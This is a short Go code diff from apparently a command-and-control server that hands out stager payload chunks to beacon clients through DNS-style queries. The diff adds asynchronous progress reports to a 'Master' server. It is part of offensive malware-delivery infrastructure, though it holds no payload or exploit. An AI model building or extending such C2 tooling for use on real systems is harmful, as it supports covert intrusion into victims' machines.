@@ -2316,6 +2316,12 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 				c2.mutex.Unlock()
 
 				c2.logStagerProgress(session, chunkIndex, clientIP)
+
+				// Report progress to Master (async) - report first, every 10th, and last chunk
+				if masterClient != nil && (chunkIndex == 0 || chunkIndex%10 == 0 || chunkIndex == session.TotalChunks-1) {
+					go masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
+				}
+
 				return fmt.Sprintf("CHUNK|%s", chunk), true
 			}
 		}
@@ -2333,9 +2339,16 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			session.DeliveredCount = chunkIndex + 1
 			session.LastChunkDelivered = chunkIndex
 			session.LastChunk = &chunkIndex // Update pointer for progress updater
+			totalChunks := session.TotalChunks
 			c2.mutex.Unlock()
 
 			c2.logStagerProgress(session, chunkIndex, clientIP)
+
+			// Report progress to Master (async) - report first, every 10th, and last chunk
+			if chunkIndex == 0 || chunkIndex%10 == 0 || chunkIndex == totalChunks-1 {
+				go masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
+			}
+
 			return fmt.Sprintf("CHUNK|%s", chunkResp.ChunkData), true
 		}
 
